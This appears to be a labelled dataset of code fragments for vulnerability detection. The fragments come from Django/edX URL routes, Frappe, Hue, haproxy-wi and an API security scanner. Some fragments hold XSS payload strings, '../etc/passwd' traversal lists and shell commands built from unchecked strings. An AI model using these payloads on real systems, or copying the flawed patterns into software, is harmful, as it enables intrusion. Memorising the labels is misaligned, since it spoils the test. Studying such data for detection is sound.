"label": 1}, {"snippet_id": 9121, "code": "/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index')", "label": 1}, {"snippet_id": 40769, "code": ".parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t", "label": 0}, {"snippet_id": 36628, "code": "\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate()", "label": 0}, {"snippet_id": 49146, "code": ".split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) if not self.is_reverse() and self.current_columns[0]==self.column_id: return self.get_url_with_query_params", "label": 0}, {"snippet_id": 49646, "code": " or 2. two element iterable in which: -first element is name of the field(string) or callable which returns html -label for the column(string) \"\"\" if not self.list_display: return[SmartColumn(self.model", "label": 0}, {"snippet_id": 29215, "code": " |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, **kwargs): \terror=\"\" \tfull_path=path +file ", "label": 0}, {"snippet_id": 11163, "code": " system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command", "label": 0}, {"snippet_id": 49196, "code": "'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self", "label": 0}, {"snippet_id": 14228, "code": " settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/',", "label": 0}, {"snippet_id": 13654, "code": ", 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 1}, {"snippet_id": 22156, "code": ", name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name", "label": 0}, {"snippet_id": 44833, "code": " in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']", "label": 0}, {"snippet_id": 45765, "code": " parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params", "label": 0}, {"snippet_id": 53152, "code": " coordinator=Coordinator(data=coordinator_dict) response['status']=0 response['xml']=coordinator.to_xml() return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission", "label": 0}, {"snippet_id": 26378, "code": " if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country returned an incorrect result. We will therefore", "label": 0}, {"snippet_id": 4598, "code": "'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee", "label": 0}, {"snippet_id": 6673, "code": " in value.split(',')] self._parsed_status_test_usernames=res return res @property def signup_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self.config.get(self.section", "label": 0}, {"snippet_id": 50315, "code": ") if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid}) def mode_keepalive(self, request", "label": 0}, {"snippet_id": 29028, "code": "') \tproxy=sql.get_setting('proxy') \tos.system(\"cp scripts/%s.\" % script) \t \tproxy_serv=proxy if proxy is not None else \"\" \t\t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+", "label": 0}, {"snippet_id": 42474, "code": "\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]", "label": 0}, {"snippet_id": 42814, "code": "\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": ", "label": 0}, {"snippet_id": 48080, "code": "(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path): os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path) with open(high_res_file_name, 'wb+') as destination: for chunk in file.chunks(): destination", "label": 0}, {"snippet_id": 13218, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls'", "label": 0}, {"snippet_id": 21078, "code": ">[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED", "label": 0}, {"snippet_id": 46212, "code": "'engines': get_engines(request.user) } }) else: return render('search.mako', request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT,", "label": 0}, {"snippet_id": 28950, "code": ", 'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\" \" +line +\"\\n\" \ttry:\t\t \t\tlog", "label": 0}, {"snippet_id": 49349, "code": " self.order_field: self.order=SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param) class SmartFilterValue(QueryParamsMixin, object): def __init__(self, field_name", "label": 0}, {"snippet_id": 54924, "code": "=set() for translated_resource in translated_resources: projects.add(translated_resource.resource.project) translated_resource.calculate_stats(save=False) bulk_update(translated_resources, update_fields=", "label": 0}, {"snippet_id": 2578, "code": " result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}", "label": 0}, {"snippet_id": 10325, "code": "(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir", "label": 0}, {"snippet_id": 17983, "code": "\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view", "label": 0}, {"snippet_id": 32691, "code": "=_AdjustTOC(has_a_single_h1) md_fragment=md.convert(contents).encode('utf-8') try: self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write", "label": 0}, {"snippet_id": 23755, "code": "'node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD", "label": 0}, {"snippet_id": 22345, "code": ".urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\",", "label": 0}, {"snippet_id": 1511, "code": ".md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid=generate_hash() content=request.get_json() try: name=content['appname'] url=content['url']", "label": 0}, {"snippet_id": 16869, "code": "/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$", "label": 0}, {"snippet_id": 42950, "code": ": \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values", "label": 0}, {"snippet_id": 17715, "code": " name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student", "label": 0}, {"snippet_id": 21820, "code": "(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings", "label": 0}, {"snippet_id": 15222, "code": " serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment", "label": 0}, {"snippet_id": 73, "code": " impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query", "label": 0}, {"snippet_id": 15294, "code": "(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR", "label": 0}, {"snippet_id": 20733, "code": "'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$',", "label": 0}, {"snippet_id": 461, "code": ".logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is", "label": 1}, {"snippet_id": 27752, "code": "-Type']='application/json' self.before_render_json(values, status) self.response.out.write(json.dumps(values, cls=JsonEncoder)) self.response.set_status(status) def handle_exception(self, exception, _)", "label": 0}, {"snippet_id": 17905, "code": " name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view", "label": 0}, {"snippet_id": 38257, "code": "\tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe", "label": 0}, {"snippet_id": 43429, "code": "\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df", "label": 1}, {"snippet_id": 28604, "code": "] \t\t\t \tif proxy is not None: \t\tapihelper.proxy={'https': proxy} \ttry: \t\tbot=telebot.TeleBot(token=token_bot) \t\tbot.send_message(chat_id=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message", "label": 0}, {"snippet_id": 45601, "code": " or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json", "label": 0}, {"snippet_id": 47753, "code": " default_forward_url: str=\"/admin/users\"): \"\"\" This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse :param request: the HttpRequest :param default_forward_url: The URL to", "label": 0}, {"snippet_id": 4283, "code": ".fuzzers.fuzzer import Fuzzer class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest", "label": 0}, {"snippet_id": 14580, "code": " command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='", "label": 0}, {"snippet_id": 35952, "code": "\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!", "label": 0}, {"snippet_id": 54553, "code": " class UserDetail(DetailView): model=User template_name='user.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['articles']=self.object.article_set.all() context", "label": 0}, {"snippet_id": 49549, "code": ", obj, str(obj.pk), self.query_params) for obj in qs ] return[SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] +values class SmartList(object): def __init__(self, object_list, query_params", "label": 0}, {"snippet_id": 24, "code": " api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line:", "label": 0}, {"snippet_id": 12525, "code": "]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups", "label": 0}, {"snippet_id": 14521, "code": " urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 36784, "code": "\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category", "label": 0}, {"snippet_id": 6020, "code": "'eduid_idp',], package_dir={'': 'src'}, zip_safe=False, install_requires=install_requires, extras_require={ 'testing': testing_extras, }, entry_points={ 'console_scripts':['eduid_idp=eduid_idp.idp:main', ] } )", "label": 0}, {"snippet_id": 5624, "code": "%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror", "label": 0}, {"snippet_id": 1480, "code": " from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder", "label": 1}, {"snippet_id": 14085, "code": "]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt", "label": 0}, {"snippet_id": 43990, "code": ", list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) ", "label": 0}, {"snippet_id": 40771, "code": " if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field", "label": 0}, {"snippet_id": 30207, "code": "\tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers\": \tovw.get_overviewServers() \t if form.getvalue('action'): \timport requests \tfrom requests_toolbelt", "label": 0}, {"snippet_id": 9635, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url", "label": 0}, {"snippet_id": 28864, "code": ": %s ' % sshException \t\tpass \texcept paramiko.BadHostKeyException as badHostKeyException: \t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException \t\tpass \texcept Exception as e: \t\tif e", "label": 0}, {"snippet_id": 14257, "code": "'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth", "label": 0}, {"snippet_id": 52705, "code": "\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml'", "label": 0}, {"snippet_id": 50238, "code": ".requests[csessid] if csessid in self.databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by render_POST when the client requests an init mode operation(at startup) Args:", "label": 0}, {"snippet_id": 968, "code": " is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers,", "label": 1}, {"snippet_id": 18270, "code": "\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 42215, "code": " datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\"", "label": 0}, {"snippet_id": 50592, "code": ") elif dmode=='keepalive': return self.mode_keepalive(request) else: return '\"\"' class AjaxWebClientSession(session.Session): \"\"\" This represents a session running in an AjaxWebclient. \"\"\" def __init__", "label": 0}, {"snippet_id": 21093, "code": ", include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url", "label": 0}, {"snippet_id": 6956, "code": ", url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user", "label": 0}, {"snippet_id": 55010, "code": " source=t.entity.string, target=t.string, locale=locale, entity=t.entity, translation=t, project=project, ) for t in( Translation.objects .filter(pk__in=changed_translation_pks) .prefetch_related('entity__resource", "label": 0}, {"snippet_id": 26462, "code": "../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc", "label": 0}, {"snippet_id": 1988, "code": "\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload)", "label": 0}, {"snippet_id": 19587, "code": "\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 50653, "code": " disconnect(self, reason=\"Server disconnected.\"): \"\"\" Disconnect from server. Args: reason(str): Motivation for the disconnect. \"\"\" csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid", "label": 0}, {"snippet_id": 29724, "code": ".split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def get_files(dir=get_config_var('configs', ", "label": 0}, {"snippet_id": 15682, "code": ".json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers", "label": 0}, {"snippet_id": 25868, "code": " None, widget=DatePickerWidget(), ) elif q.type==Question.TYPE_TIME: field=forms.TimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).time(", "label": 0}, {"snippet_id": 4323, "code": " payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload", "label": 1}, {"snippet_id": 26653, "code": "%2e%2f%2e%2e%2fetc%2fpasswd%00', '../../boot.ini', '../../../boot.ini', '../../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '../../../../../../../boot.ini', '../../../../..", "label": 0}, {"snippet_id": 12965, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns", "label": 0}, {"snippet_id": 29483, "code": ", stdout, stderr=ssh.exec_command(command, get_pty=True) \t\tif not stderr.read(): \t\t\treturn True \t\telse: \t\t\treturn False \tssh.close() \t\t def show_log(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class", "label": 0}, {"snippet_id": 52969, "code": ".content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator", "label": 0}, {"snippet_id": 50713, "code": " self.sessionhandler.data_out(self, **kwargs) def send_text(self, *args, **kwargs): \"\"\" Send text data. This will pre-process the text for color-replacement, conversion to html etc. Args: text(str): Text", "label": 0}, {"snippet_id": 14509, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings", "label": 0}, {"snippet_id": 13414, "code": ", 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower", "label": 0}, {"snippet_id": 52304, "code": "']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return", "label": 0}, {"snippet_id": 42938, "code": "\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self", "label": 0}, {"snippet_id": 6134, "code": " def __init__(self, filename, debug): self._parsed_content_packages=None self._parsed_status_test_usernames=None self.section=_CONFIG_SECTION _CONFIG_DEFAULTS['debug']=str(debug) cfgdir=os.path.dirname", "label": 0}, {"snippet_id": 5681, "code": "', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm", "label": 0}, {"snippet_id": 21647, "code": "\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 19975, "code": ".\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils", "label": 0}, {"snippet_id": 46087, "code": ".GET: query['qs'][0]['q']=request.GET.get('q') if 'qd' in request.GET: query['qd']=request.GET.get('qd') template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ ", "label": 1}, {"snippet_id": 24025, "code": "--process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual", "label": 0}, {"snippet_id": 6809, "code": " self.config.get(self.section, 'authn_info_mongo_uri') @property def max_authn_failures_per_month(self): \"\"\" Disallow login for a user after N failures in a given month. This is said to be an imminent Kantara", "label": 0}, {"snippet_id": 29501, "code": ": \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint", "label": 0}, {"snippet_id": 12037, "code": ".module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$',", "label": 0}, {"snippet_id": 11593, "code": "'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', ", "label": 0}, {"snippet_id": 16245, "code": " name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if", "label": 0}, {"snippet_id": 52467, "code": "-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\"", "label": 0}, {"snippet_id": 1694, "code": "['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name", "label": 0}, {"snippet_id": 52122, "code": "=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps", "label": 1}, {"snippet_id": 46698, "code": "['data']=data return kwargs def form_valid(self, form): selected_flags=[] for question in entry_form_config: flag=form.cleaned_data.get(str(question['id']), False) if flag: selected_flags.append(getattr", "label": 0}, {"snippet_id": 30957, "code": " \ttemplate=env.get_template('config_show.html') \t \ttemplate=template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t", "label": 0}, {"snippet_id": 27942, "code": "(self, request, response): self.initialize(request, response) self.upload=None def get_upload(self): \"\"\"Get uploads.\"\"\" if self.upload: return self.upload upload_key=self.request.get('upload_key') if not", "label": 0}, {"snippet_id": 5836, "code": "\"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls", "label": 0}, {"snippet_id": 39819, "code": "=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t", "label": 0}, {"snippet_id": 3489, "code": "\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse", "label": 0}, {"snippet_id": 4037, "code": "+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result", "label": 0}, {"snippet_id": 39556, "code": "(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus", "label": 0}, {"snippet_id": 51160, "code": " date class Meta: ordering=[\"-name\"] class IECrontabSchedule(ImportExportModelAdmin): pass admin.site.unregister(PeriodicTask) admin.site.unregister(CrontabSchedule) admin.site.register(PeriodicTask, IEPeriodicTaskAdmin", "label": 0}, {"snippet_id": 19645, "code": " suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}", "label": 0}, {"snippet_id": 701, "code": ".items(): try: result='' 